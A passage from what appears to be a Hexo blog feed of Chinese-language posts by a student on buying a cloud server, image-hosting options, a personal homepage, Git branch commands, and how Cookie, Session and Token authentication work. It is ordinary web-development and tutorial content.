title="有什么用？"></a>有什么用？</h2><p>一台服务器有很多用处，值得我们持续探索。一般的建站呀，文件存储这些都不一一列举了，下面来说说我买云服务器的原因吧。目前我还是一名大三学生，对于平时的开发，一些项目如果需要服务器之类的资源，其实有更廉价便捷的方案，比如使用docker。那为什么还是决定买一台服务器呢？</p><ol><li>使用docker只能做到本地运行或者说只能做到内网使用，想要在外网访问本地项目，就必须有一个公网ip。也许大家会说使用内网穿透，但是从费用上来看，差不了多少，所以为什么不干脆直接买一台服务器，上面的问题都能迎刃而解了。</li><li>我的博客是使用GitHub Pages来搭建的，所以说源站资源在国外的服务器上，国内访问非常慢。想要加速到比较好的效果，使用CDN应该是首选。而CDN服务器如果选在国内，那么域名需要备案，接入商备案就需要提供你的公网ip。发现了吗？又是公网ip。</li><li>就我目前的情况，大概率是回去读研的，但只能说读研可能会是一种选择，如果大四能够拿到好的offer，我不介意直接工作。那如果将来读研，一些学习资料代码和论文之类的肯定会放在实验室的主机上。这样不管是在宿舍还是回家，都会需要远程实验室的主机。在宿舍还好，毕竟在同一局域网，直接用内网ip，但如果出了学校，就比较麻烦了。我知道解决方案不止服务器，很多远程软件也可以解决，但是一般这种都需要付费（什么德行大家应该都懂），这时候服务器就能派上用场了。</li><li>最后就是上文提到的，docker结合服务器可以玩出新高度，很多好用的软件结合服务器会有意想不到的体验感。通过服务器慢慢搭建属于自己的生态环境，是一件很酷的事情。</li></ol><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如果小伙伴们目前还是本科，其实还犯不着买云服务器（富哥除外），真的想用服务器，可以去试试和老师套套近户，白嫖他们实验室的服务器也是不错的~当然也可以去国外买VPS服务器，也是相对便宜的，我只要是考虑这是我的第一台服务器，所以希望有些保障，所以选择了阿里云，其实国内除阿里云外，还有腾讯云、华为云等，国外的亚马逊云也是值得信赖的。</p><p>后面会分享一些基于服务器的有意思的项目给大家，都是些在收藏夹里“吃灰”的项目。现在有了自己的服务器，当然要都玩一遍😋我会在这篇<a href="https://blog.xxfer.cn/posts/9a5ae3b8.html">博客</a>里记录我的使用日志。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECS </tag>
            
            <tag> Web </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Freeimg 图床！又是白嫖的一天^_^</title>
      <link href="/posts/518ec1ac.html"/>
      <url>/posts/518ec1ac.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e8613a6d5d0.png</cover>
      <date>Mon Dec 25 2023 20:27:33 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="初识图床"><a href="#初识图床" class="headerlink" title="初识图床"></a>初识图床</h2><p>图床图床，就是用来存放图片的温床，博客内有大量的图片，大量的地方需要使用到图片，优化博客加载方便管理的除了压缩图片的大小之外，首选就是多处使用图片链接，到不同的资源地址去进行加载来完成图片的加载。</p><h2 id="安利一个免费图床——-Freeimg-图床"><a href="#安利一个免费图床——-Freeimg-图床" class="headerlink" title="安利一个免费图床—— Freeimg 图床"></a>安利一个免费图床—— Freeimg 图床</h2><p>这是我接触的第一个免费图床，只需要注册就会有100MB的容量，容量确实比较少，可人家毕竟是免费的。Freeimg图床在国内的访问速度挺快的，至少比GitHub上的访问迅速。</p><p>该图床已经出来100天了，仍处于推广期，元旦有福利发放，加入用户群就送 1GB 的容量，确实挺良心的了。大家如果用量不大，可以考虑一下，是个不错的选择。至于跑路，群主也说了，在停止服务之前会有通知，方便大家备份数据，所以在近半年时间我认为都能放心使用吧。下面就是Freeimg图床链接：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.freeimg.cn/">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/26/6589a9fe738b8.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Freeimg.cn</div>            <div class="tag-link-sitename">owen0o0</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h2 id="网络免费图床"><a href="#网络免费图床" class="headerlink" title="网络免费图床"></a>网络免费图床</h2><p>上网搜索就能搜索到不少免费的图床供应商，Freeimg就是我搜到的，一直用到现在。其他还有 SMMS 等不多介绍。</p><p>网上的免费图床一般只需要注册，就能快速使用，也方便管理，关键是免费无需配置。但是它们的缺点也很明显：容易跑路、不稳定、容量小、不能支持图片处理等。因此，大家还是会不停地寻找其他更合适的图床方案，我也是如此。</p><h2 id="Github-图床"><a href="#Github-图床" class="headerlink" title="Github 图床"></a>Github 图床</h2><p>大部分同学都是没有公网服务器的，所以就想到了这一类开源仓库。这种方案有很多优点，这里不再赘述。但是它存在比较致命的缺点：访问速度太慢了，而且还有被封号仓库的风险。有同学可能会说使用 CDN 加速，关于 CDN，不了解的同学可以来看看我写的这篇<a href="https://blog.xxfer.cn/posts/992dd5ba.html">CDN简介，推荐一些国内可用的CDN</a><br>使用 CDN 确实能够提高访问速度，但是 CDN 服务器的流量费用也不便宜鸭~</p><p>一个比较成熟的方案是使用 github + jsd + PicGo<br>感兴趣的同学可以去学习一下，之后我可能也会去尝试一下，如果有好的方案，我会第一时间告诉大家哦。</p><p>更新：<a href="https://blog.xxfer.cn/posts/92211228.html">jsd图床搭建</a></p><h2 id="npm-图床"><a href="#npm-图床" class="headerlink" title="npm 图床"></a>npm 图床</h2><p>具体配置方法可以去参考下面这篇安知鱼的博客</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://blog.anheyu.com/posts/72ea.html">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">npm 图床</div>            <div class="tag-link-sitename">npm 图床配置教程</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><p>配置也比较简单，关键这是免费的，而且选择对的镜像访问速度也很可观，不足之处就是非常依赖镜像，镜像炸了图床也就一起没了，而且容量一般一个版本就100-200MB。</p><h2 id="腾讯云或阿里云等各大平台的云存储OSS-CDN方案"><a href="#腾讯云或阿里云等各大平台的云存储OSS-CDN方案" class="headerlink" title="腾讯云或阿里云等各大平台的云存储OSS+CDN方案"></a>腾讯云或阿里云等各大平台的云存储OSS+CDN方案</h2><p>这个方案比较好，缺点是需要一定成本，大概为每年 20 元的存储费用 ➕ CDN 费用，CDN 为流量加速费用，具体得看站点流量大小。又拍云与七牛云都有免费的存储与 CDN 额度可以自行申请。毕竟是大厂，稳定性肯定是能够保证的，就是配置麻烦点。</p><h2 id="自建图床"><a href="#自建图床" class="headerlink" title="自建图床"></a>自建图床</h2><p>当然喽，如果你有一台服务器，那么你就可以自建自己的图床，以达到稳定性与速度兼备，可以自建<a href="https://github.com/lsky-org/lsky-pro">兰空图床</a>，这是国人开发的一个项目，缺点大概就是需要一台服务器的费用。这个图床项目比较适合一人开发，多人使用的场景，不难发现，Freeimg图床就是使用兰空图床搭建的。</p><p>关于自建图床的项目，其实在GitHub上就有不少的开源项目，大家自己去学习探索，然后在评论区分享给大家。</p><h2 id="付费图床"><a href="#付费图床" class="headerlink" title="付费图床"></a>付费图床</h2><p>Freeimg就可以通过付费获取更大的容量。其他的还有<a href="https://image.anheyu.com/">鱼佬的图床</a>和杜老师的<a href="https://7bu.top/">去不图床</a>，它们都是值得信赖的。一般 10 元 1G, 容量收费。记得给我打广告费~~~</p><h2 id="我的图床方案"><a href="#我的图床方案" class="headerlink" title="我的图床方案"></a>我的图床方案</h2><p>请参考<a href="https://blog.xxfer.cn/posts/6a3f672a.html">小李的图床方案</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>没有属于自己的主页？我的个人主页搭建日记</title>
      <link href="/posts/3d879cfb.html"/>
      <url>/posts/3d879cfb.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e860d5472fd.png</cover>
      <date>Mon Dec 25 2023 20:27:33 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>前段时间一直在填坑，再加上域名备案没下来，解析不了，所以一直没搞个人主页的事情。昨天域名备案终于下来了，今天把个人主页的事结束。</p><p>话不多说，上链接：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://xxfer.cn">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2024/01/06/65994c3874b85.jpg)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">小李同学|WebSite</div>            <div class="tag-link-sitename">xxfer.cn</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h2 id="主页描述"><a href="#主页描述" class="headerlink" title="主页描述"></a>主页描述</h2><h3 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h3><p>本来想用这张背景的，最后还是换了，两个都挺好看的！</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/06/659952e76898f.png" style="width:800px;"/></div></div><h3 id="时间胶囊和工具"><a href="#时间胶囊和工具" class="headerlink" title="时间胶囊和工具"></a>时间胶囊和工具</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/06/659953858934b.png" style="width:800px;"/></div></div><p>可以看时间这种，还有一些自己平时觉得还用的工具页，其实这个完全能作为浏览器的标签页了。</p><h3 id="音乐界面"><a href="#音乐界面" class="headerlink" title="音乐界面"></a>音乐界面</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/06/659953aa87400.png" style="width:800px;"/></div></div><p><strong>整体就是这样，主页本来就是做个导航页，所以不想搞得很复杂。</strong></p><h3 id="最终版本（换了一张背景）"><a href="#最终版本（换了一张背景）" class="headerlink" title="最终版本（换了一张背景）"></a>最终版本（换了一张背景）</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/06/659954c49e2a8.png" style="width:800px;"/></div></div><h2 id="部署考量"><a href="#部署考量" class="headerlink" title="部署考量"></a>部署考量</h2><p>刚开始，想着用自己的服务器，用宝塔去搭，主要这个完全是个静态网页（动态资源很少）。<br>可最后想想还是用GitHub，主要有以下几点考虑：</p><ul><li>个人主页和博客，包括之后要建的“秘密空间”（记录自己的CTF学习总结），都是相对公开的，所以访问量会比较高。虽然服务器设置了一些安全措施，但是我自知才疏学浅，很多的潜在隐患可能还是会被别有用心的人利用。为了避免这些不必要的麻烦，最终选择部署在GitHub上。</li><li>另外GitHub也方便更新管理，部署方便，也不用担心GitHub被攻击，即使攻击了对我也没有太大损失。</li><li>服务器主要用于搭建自己的开发环境，放一些实用的小应用，不打算过于公开。</li></ul><p>所以，我最后还是选择了部署在GitHub上，可能唯一的缺陷就是访问慢，不过这个套一层CDN基本就能解决，而且现在访问量也不大，完全承受的了。虽然用自己的服务器还是得套CDN，肯定是不能让源IP直接裸露在外的，对于一些师傅的话有没有都一样(doge)。绕过CDN获取源服务器IP的方法也有很多，大家其实在搭建网站的时候需要注意像评论呀、邮箱等第三方验证的防护，总之这些不是一两句就能解释清的，我也不想在各位师傅面前班门弄斧。</p><p>既然决定搭建在GitHub上，其实也就不需要多说了，和博客搭建的方式一样。最后做好域名解析，CDN流量控制，一些必要的安全措施就行。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
            <tag> 个人主页 </tag>
            
            <tag> DIY </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git：独立开发者应该如何管理仓库分支？</title>
      <link href="/posts/f73e6dd5.html"/>
      <url>/posts/f73e6dd5.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/24/6587a9da8a05d.jpg</cover>
      <date>Sat Dec 23 2023 11:16:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>前段时间考试比较多，今天终于有空可以整理有关Git分支的管理使用技巧，相信大家对Git应该都不陌生，所以直接进入正题。</p><p>如果大家觉得看书面材料太无聊，推荐大家视频学习：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.999.0.0&vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658fb2cbc152c.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Git核心原理</div>            <div class="tag-link-sitename">技术蛋老师</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><p>蛋蛋老师的视频真心不错，大家可以学习了这个视频以后再看下面的内容，别忘了关注 + 一键三连。<br>其实我觉得蛋老师的视频已经足够大家学习一阵子了。</p><p>这篇<a href="https://zhuanlan.zhihu.com/p/263050507">图解Git操作，一篇就够</a>写得很不错，还有图例。</p><h2 id="什么是分支？"><a href="#什么是分支？" class="headerlink" title="什么是分支？"></a>什么是分支？</h2><p>在任何代码管理工具中, 分支都是一个非常重要的概念。<br>分支是主线某个状态的一个复制, 在不影响主线情况下, 可以有新的变化。</p><p>实际生活中，我们的工作一般都是在一条主线(master&#x2F;main)上进行，每一次提交会形成一个commit对象。客户提出了一个新的需求，而这个需求的开发需要一段时间才能完成。为了不影响主线的稳定性和持续进行。 我们会怎么做？我们可以把整个项目复制一份，在复制的项目上开发新功能，开发完成通过测试后，再将改动的代码整合回主线。那么，这个复制出来的项目就是一个分支。</p><h2 id="重要的分支操作"><a href="#重要的分支操作" class="headerlink" title="重要的分支操作"></a>重要的分支操作</h2><p>相信大家看了蛋老师的视频以后，至少对Git已经有了入门级的了解。那么现在，让我们整理一下Git的常用命令。</p><p>Git工作流基本可以参考下面这张图：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/03/659562c9a239a.png" style="width:800px;"/></div></div><p><strong>一定要搞清楚远程仓库、本地仓库、暂存区和工作区的概念</strong></p><h3 id="克隆项目"><a href="#克隆项目" class="headerlink" title="克隆项目"></a>克隆项目</h3><p>从服务器上进行克隆项目到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:JJLibra/Astar.git</span><br></pre></td></tr></table></figure><p>执行<code>git clone</code>就会生成一份副本，在本地仓库和工作区都会同步副本</p><h3 id="提交代码"><a href="#提交代码" class="headerlink" title="提交代码"></a>提交代码</h3><ul><li>git status：查看文件状态。</li><li>git add .：文件添加进暂存区。</li><li>git commit -m “提交信息”：文件添加进本地仓库，-m参数改为-am可以直接推向本地仓库。</li><li>git push：文件推向远程仓库。</li><li>git log：查看文件提交日志，每一个commit都会有自己的commit的ID。</li></ul><p>运行<code>git commit -a</code>相当于运行<code>git add</code>把所有文件加入暂存区，然后再运行<code>git commit</code>把文件提交本地仓库。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/03/659569653eb91.jpg" style="width:800px;"/></div></div><h3 id="代码回退"><a href="#代码回退" class="headerlink" title="代码回退"></a>代码回退</h3><ul><li>git fetch：从远程仓库拉取代码到本地仓库。</li><li>git reset –files：用本地仓库覆盖暂存区中修改，也就是覆盖最后一次git add的内容，即撤销提交到暂存区的内容。</li><li>git checkout –files：把文件从暂存区复制到工作区，用于放弃本地的修改。</li><li>git checkout HEAD –files：回退最后一次的提交内容。</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/03/659569933738f.jpg" style="width:800px;"/></div></div><h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><ul><li>git reset –hard HEAD^：回退上一个版本。在Git中HEAD表示当前版本，HEAD^表示上一个版本。</li></ul><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><ul><li>git rm filename：在工作区删除，如果需要从版本库中删除文件可以使用git rm命令进行删除，然后提交。</li></ul><p>如果删除错了，可以使用<code>git checkout -- filename</code>进行恢复，其原理就是使用版本库的文件替换工作区的文件。</p><h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><ul><li>git branch &lt;分支名字&gt;：新建一个分支。</li><li>git checkout &lt;分支名字&gt;：新建立后分之后，切换分支。</li><li>git branch：查看本地的分支情况，分支前面带有*号的表示当前的分支。</li><li>git merge &lt;分支名字&gt;：<strong>合并指定的分支到当前分支</strong>。</li><li>git branch -d &lt;分支名字&gt;：删除分支，假如分支删除不了，可以通过：git branch -D &lt;分支名字&gt;，强制删除分支。</li><li>git remote：查看远程仓库的情况，加上-v参数可以查看详细情况。</li><li>git push origin master：将本地master分支推送到远程库。</li><li>git pull：拉取远程仓库的分支到本地仓库。相当于执行git fetch和git merge命令。</li></ul><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>需要注意git fetch和git pull之间的区别！可以参考这篇<a href="https://zhuanlan.zhihu.com/p/123370920">详解git pull和git fetch的区别</a></p></div><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>可以在VScode中安装Git插件，方便使用。</p><p>分支的操作其实还有很多，常用的都已经罗列在上面了，使用时结合图例和git结构，熟能生巧，慢慢就能掌握。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自主开发 </tag>
            
            <tag> GitHub </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie、Session、Token的区别？如何进行用户校验，保持用户登录状态？</title>
      <link href="/posts/c98645fd.html"/>
      <url>/posts/c98645fd.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/07/65e93d3701383.png</cover>
      <date>Sun Dec 10 2023 12:10:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>现代社会离不开网络，购物等都会选择在 Web 中进行。而且我们会发现只要登录以后，很长一段时间就不需要重新登录了，今天有空将Web中部分校验机制的知识做一个梳理（本人彩笔，如果有总结的不对的，勿喷，并请大佬评论指正，我会及时修改）。</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>在 Cookie 之前，先有HTTP。1991 年 HTTP 0.9 诞生了，当时只是为了满足大家浏览 web 文档的要求 ，所以只有 GET 请求，浏览完就走了，两个连接之间是没有任何联系的，所以说HTTP是一种无状态的协议，因为它诞生之初就没有这个需求。</p><h4 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h4><p>一种无状态的协议：对于事务处理没有记忆能力，每次客户端和服务端会话完成时，服务端不会保存任何会话信息。每个请求都是完全独立的，服务端无法确认当前访问者的身份信息，无法分辨上一次的请求发送者和这一次的发送者是不是同一个人。所以服务器与浏览器为了进行会话跟踪（知道是谁在访问我），就必须主动的去维护一个状态，这个状态用于告知服务端前后两个请求是否来自同一浏览器。而这个状态需要通过 cookie 或者 session 去实现。</p><p>比如我们现在日常的网上购物，需要记录用户的购物车记录，就需要有一个机制记录每个连接的关系，来方便我们了解加入购物车的商品到底属于谁。也就是我们所说的交互式 Web （不光可以浏览，还可以登录，发评论，购物等用户操作的行为）。</p><h4 id="Cookie-一般工作机制"><a href="#Cookie-一般工作机制" class="headerlink" title="Cookie 一般工作机制"></a>Cookie 一般工作机制</h4><p><img src="https://www.freeimg.cn/i/2023/12/21/6583d87e6da31.png" alt="Cookie一般工作机制"></p><h4 id="以购物车为例"><a href="#以购物车为例" class="headerlink" title="以购物车为例"></a>以购物车为例</h4><p><img src="https://www.freeimg.cn/i/2023/12/21/6583d8acc03e2.png" alt="Cookie购物车工作机制"></p><ol><li><p>cookie 存储在客户端： cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。</p></li><li><p>cookie 是不可跨域的： 每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用，一级域名和二级域名之间是允许共享使用的（靠的是 domain）。</p></li></ol><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>随着购物车内的商品越来越多，每次请求的 cookie 也越来越大，这对每个请求来说是一个很大的负担，我们只是想将一个商品加入购买车，为何要将历史的商品记录也一起返回给 server ？购物车信息其实已经记录在 server 了，浏览器这样的操作岂不是多此一举？如何改进呢？</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>由于用户的购物车信息都会保存在 Server 中，所以在 Cookie 里只要保存能识别用户身份的信息，知道是谁发起了加入购物车操作即可，这样每次请求后只要在 Cookie 里带上用户的身份信息，请求体里也只要带上本次加入购物车的商品 id，大大减少了 cookie 的体积大小，我们把这种能识别哪个请求由哪个用户发起的机制称为 Session（会话机制），生成的能识别用户身份信息的字符串称为 sessionId。</p><h4 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h4><p><img src="https://www.freeimg.cn/i/2023/12/21/6583dbb7cc9b5.png" alt="session购物工作机制.png"></p><h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><p>看起来通过 cookie + session 的方式是解决了问题， 但是我们忽略了一个问题，上述情况能正常工作是因为我们假设 server 是单机工作的，但实际在生产上，为了保障高可用，一般服务器至少需要两台机器，通过负载均衡的方式来决定到底请求该打到哪台机器上。</p><p><img src="https://www.freeimg.cn/i/2023/12/21/6583dc882255a.png" alt="session负载均衡工作机制.png"></p><p>假设登录请求打到了 A 机器，A 机器生成了 session 并在 cookie 里添加 sessionId 返回给了浏览器，那么问题来了：下次添加购物车时如果请求打到了 B 或者 C，由于 session 是在 A 机器生成的，此时的 B,C 是找不到 session 的，那么就会发生无法添加购物车的错误，就得重新登录了，此时请问该怎么办。</p><h4 id="balance"><a href="#balance" class="headerlink" title="balance"></a>balance</h4><ol><li><p>session 复制</p><p>A 生成 session 后复制到 B, C，这样每台机器都有一份 session，无论添加购物车的请求打到哪台机器，由于 session 都能找到，故不会有问题</p></li><li><p>session 粘连</p><p>这种方式是让每个客户端请求只打到固定的一台机器上，比如浏览器登录请求打到 A 机器后，后续所有的添加购物车请求也都打到 A 机器上，Nginx 的 sticky 模块可以支持这种方式，支持按 ip 或 cookie 粘连等等，如按 ip 粘连方式如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upstream tomcats &#123;</span><br><span class="line">　　ip_hash;</span><br><span class="line">　　server 10.1.1.107:88;</span><br><span class="line">　　server 10.1.1.132:80;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>session 共享</p><p>这种方式也是目前各大公司普遍采用的方案，将 session 保存在 redis，memcached 等中间件中，请求到来时，各个机器去这些中间件取一下 session 即可。</p></li></ol><p><img src="https://www.freeimg.cn/i/2023/12/21/6583df21665cc.png" alt="session 共享.png"></p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>通过上文分析我们知道通过在服务端共享 session 的方式可以完成用户的身份定位，但是不难发现也有一个小小的瑕疵：搞个校验机制我还得搭个 redis 集群？大厂确实 redis 用得比较普遍，但对于小厂来说可能它的业务量还未达到用 redis 的程度，所以有没有其他不用 server 存储 session 的用户身份校验机制呢，就是token。</p><p>首先请求方输入自己的用户名，密码，然后 server 据此生成 token，客户端拿到 token 后会保存到本地，之后向 server 请求时在请求头带上此 token 即可。</p><p><img src="https://www.freeimg.cn/i/2023/12/21/6583deac8777c.png" alt="token工作机制.png"></p><ol><li><p>token 只存储在浏览器中，服务端却没有存储，这样的话我随便搞个 token 传给 server 也行？</p><p>server 会有一套校验机制，校验这个 token 是否合法。</p></li><li><p>怎么不像 session 那样根据 sessionId 找到 userid 呢，这样的话怎么知道是哪个用户？</p><p>token 本身携带 uid 信息。</p></li></ol><h4 id="HTTPS-签名机制校验-JWT"><a href="#HTTPS-签名机制校验-JWT" class="headerlink" title="HTTPS 签名机制校验 (JWT)"></a>HTTPS 签名机制校验 (JWT)</h4><p><img src="https://www.freeimg.cn/i/2023/12/21/6583dff0e5250.png" alt="JWT请求.png"></p><ol><li>header：指定了签名算法</li><li>payload：可以指定用户 id，过期时间等非敏感数据</li><li>Signature: 签名，server 根据 header 知道它该用哪种签名算法，再用密钥根据此签名算法对 head + payload 生成签名，这样一个 token 就生成了。</li></ol><p>当 server 收到浏览器传过来的 token 时，它会首先取出 token 中的 header + payload，根据密钥生成签名，然后再与 token 中的签名比对，如果成功则说明签名是合法的，即 token 是合法的。而且你会发现 payload 中存有我们的 userId，所以拿到 token 后直接在 payload 中就可获取 userid，避免了像 session 那样要从 redis 去取的开销。</p><div class="note warning simple"><p>header, payload 实际上是以 base64 的形式存在的，文中为了描述方便，省去了这一步。</p></div><p>只要 server 保证密钥不泄露，那么生成的 token 就是安全的，因为如果伪造 token 的话在签名验证环节是无法通过的，就此即可判定 token 非法。<br>可以看到通过这种方式有效地避免了 token 必须保存在 server 的弊端，实现了分布式存储，不过需要注意的是，token 一旦由 server 生成，它就是有效的，直到过期，无法让 token 失效，除非在 server 为 token 设立一个黑名单，在校验 token 前先过一遍此黑名单，如果在黑名单里则此 token 失效，但一旦这样做的话，那就意味着黑名单就必须保存在 server，这又回到了 session 的模式，那直接用 session 不香吗。所以一般的做法是当客户端登出要让 token 失效时，直接在本地移除 token 即可，下次登录重新生成 token 就好。<br>另外需要注意的是 token 一般是放在 header 的 Authorization 自定义头里，不是放在 Cookie 里的，这主要是为了解决跨域不能共享 Cookie 的问题。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>session 和 token 本质上是没有区别的，都是对用户身份的认证机制，只是他们实现的校验机制不一样而已（一个保存在 server，通过在 redis 等中间件获取来校验，一个保存在 client，通过签名校验的方式来校验），多数场景上使用 session 会更合理，但如果在单点登录，一次性命令认证上使用 token 会更合适，最好在不同的业务场景中合理选型，才能达到事半功倍的效果。<br>其实我们把 cookie 和 token 比较本身就不合理，一个是存储方式，一个是验证方式，正确的比较应该是 session vs token。其实cookie与session相比较也是不合理的，我们只要能够理解它们各自之间的联系和工作机制即可。<br>上面只是简单的介绍了一下三者，具体实现过程中还会涉及到认证、授权、凭证以及加密等知识。如何能够让校验机制花费较小的性能损耗，又能保证安全是我们的追求。</p><h2 id="参考学习资料"><a href="#参考学习资料" class="headerlink" title="参考学习资料"></a>参考学习资料</h2><p><a href="https://zhuanlan.zhihu.com/p/625995458">一文讲透Token与Cookie、Session的区别 - 知乎</a></p><p><a href="https://zhuanlan.zhihu.com/p/164696755">还分不清 Cookie、Session、Token、JWT？</a></p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1ob4y1Y7Ep/?spm_id_from=333.999.0.0&vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658fb2cbc152c.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Cookie、Session、Token究竟区别在哪？</div>            <div class="tag-link-sitename">技术蛋老师</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CI/CD：企业提高开发效率的重要方式</title>
      <link href="/posts/35e49d5e.html"/>
      <url>/posts/35e49d5e.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/28/658d86a85e94e.png</cover>
      <date>Thu Nov 23 2023 20:27:33 GMT+0000</date>
      
